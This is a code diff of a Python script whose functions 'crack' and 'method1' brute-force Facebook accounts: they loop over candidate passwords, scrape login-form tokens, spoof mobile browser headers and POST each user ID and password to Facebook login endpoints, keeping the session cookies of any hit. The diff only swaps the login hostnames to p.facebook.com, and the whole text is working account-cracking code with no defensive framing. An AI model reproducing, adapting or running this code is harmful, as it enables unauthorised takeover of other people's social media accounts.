@@ -439,7 +439,7 @@ def crack(idf,pwx,url,awal):
 	for pw in pwx:
 		try:
 			ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 8A Pro Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
-			link = ses.get(f"https://free.facebook.com/?zero_e=3&zero_et=1665469721&_rdc=1&_rdr").text
+			link = ses.get(f"https://p.facebook.com/?zero_e=3&zero_et=1665469721&_rdc=1&_rdr").text
 			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
 			head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
 			bx = ses.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=date, headers=head)
@@ -499,7 +499,7 @@ def method1(idf,pwx,url):
         ua2 = random.choice(ugen2)
         for pw in pwx:
             session = requests.Session()
-            url = 'https://m.facebook.com/login/device-based/password/?uid=%s&flow=login_no_pin&refsrc=deprecated&_rdr'%(ids)
+            url = 'https://p.facebook.com/login/device-based/password/?uid=%s&flow=login_no_pin&refsrc=deprecated&_rdr'%(ids)
             raw = session.get(url).text
             koki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
             koki+=' m_pixel_ratio=2; wd=412x756'
@@ -507,10 +507,10 @@ def method1(idf,pwx,url):
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(raw)).group(1),
             "uid":idf,
             "flow":"login_no_pin",
-            "next":"https://m.facebook.com/login/save-device/",
+            "next":"https://p.facebook.com/login/save-device/",
             "pass":pw}
             header = ({
-                'authority':'https://m.facebook.com',
+                'authority':'https://p.facebook.com',
                 'method': 'GET',
                 'path': '/home.php?ref=dbl&paipv=0&eav=AfY9nSODAyThp0fXb4GeKvLmybnqz5LCCoGmQ2SoyB1dgqSRR-aE-MSXdq7EnRUb8us&tbua=1&zero_e=2&zero_et=1667306831&_rdc=1&_rdr',
                 'scheme':' https',
@@ -529,7 +529,7 @@ def method1(idf,pwx,url):
                 'upgrade-insecure-requests': '1',
                 'user-agent': ua
             })
-            post_request = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=payload,headers=header,allow_redirects=False).text
+            post_request = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=payload,headers=header,allow_redirects=False).text
             #print(post_request.title)
             cookies = session.cookies.get_dict().keys()
             open('kkk.html','w').write(post_request)
